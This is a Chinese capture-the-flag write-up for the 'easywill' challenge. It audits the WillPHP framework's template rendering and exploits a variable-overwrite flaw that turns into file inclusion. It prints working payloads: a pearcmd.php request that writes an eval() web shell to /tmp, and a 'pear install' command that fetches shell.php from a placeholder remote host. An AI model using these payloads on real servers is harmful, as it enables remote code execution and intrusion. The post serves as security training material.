---
title: '[HXBCTF 2021]easywill'
date: 2024-11-05 16:42:15
tags: 
      - 框架
      - 漏洞
      - WILLPHP
categories: 刷题笔记
---

## [HXBCTF 2021]easywill

![image-20241105201715505](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052017702.png)

这道题需要我们下载框架源码，自行修改审计，没找到2.1.5的源码，将就下用最新的吧

下面开始审计，修改app/controller/IndexController.php 的内容与题目给出的一致

![image-20241105202255324](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052022391.png)

我们跟进assign函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/5abb1a51625940888b5131ee3565370b.png)

然后继续跟进assign，到helper.php

![image-20241105202354160](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052023228.png)

继续跟进到View.php

![image-20241105202419410](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052024463.png)

我们退回到helper.php

再看view函数

![image-20241105202546466](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052025496.png)

```
function view($file = '', $vars = []) {
	return \wiphp\View::fetch($file, $vars);//调用了View中的fetch方法
```

跟进到View..php

![image-20241105202655234](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052026266.png)

```
public static function fetch($file = '', $vars = []) {
		if (!empty($vars)) self::$vars = array_merge(self::$vars, $vars);			
		$viewfile = self::getViewFile($file);
		if (file_exists($viewfile)) {
			array_walk_recursive(self::$vars, 'self::parseVars'); //处理输出
			define('__RUNTIME__', round((microtime(true) - START_TIME) , 4));	
			Template::render($viewfile, self::$vars);
		} else {
			App::halt($file.' 模板文件不存在。');
		}
	}
```

跟进**render**，进入**Tempate.php**

```
public static function renderTo($viewfile, $vars = []) {
		$m = strtolower(__MODULE__);
		$cfile = 'view-'.$m.'_'.basename($viewfile).'.php';
		if (basename($viewfile) == 'jump.html') {
			$cfile = 'view-jump.html.php';
		}
		$cfile = PATH_VIEWC.'/'.$cfile;
		if (APP_DEBUG || !file_exists($cfile) || filemtime($cfile) < filemtime($viewfile)) {
			$strs = self::compile(file_get_contents($viewfile), $vars);
			file_put_contents($cfile, $strs);
		}
		extract($vars); //将键值赋值给变量
		include $cfile;
	}
```

可以看到存在变量覆盖以及文件包含

所以这里构造

```php
Copyname=cfile & value=想写入的内容 即可形成文件包含漏洞
```

当我们开启远程debug后我们测试**?name=cfile&value=AAAA**，可以看到**$cfile=AAAA**

所以这里可以写入shell到tmp目录，关于**pearcmd.php**，可见[详解](https://blog.csdn.net/rfrder/article/details/121042290)

**出网的利用姿势**

```php
Copypear install -R /tmp http://xxxxxxx/shell.php
```

**不出网的利用姿势**

```php
Copypear -c /tmp/.feng.php -d man_dir=<?=eval($_POST[0]);?> -s
```

所以最终**payload**

```php
Copy?name=cfile&value=/usr/local/lib/php/pearcmd.php&+config-create+/<?=eval($_POST[0])?>+/tmp/aa.php
```

这里要千万注意，不能直接到url里构造，否则`<>`会被url编码，我们写的shell就不会被解析了，所以我们要移步到burp中写

![image-20241105215941014](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052159044.png)

写入成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/d171e80e41e84c878b57f44be693177d.png)

接着我们尝试执行phpinfo查看是否真正写入成功

```ruby
Copyhttp://53bb636f-9fbc-43f2-bd4a-be7c1efff83a.node4.buuoj.cn:81/?name=cfile&value=/tmp/aa.php
```

![image-20241105215918680](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052159715.png)

可以看到，的确成功了，接着查看根目录下的文件

![image-20241105215911457](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052159503.png)

看到flag文件，打开即可获得flag

![image-20241105215901903](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411052159238.png)

参考：https://www.cnblogs.com/phant0m/articles/16450670.html

https://blog.csdn.net/weixin_43610673/article/details/121369384

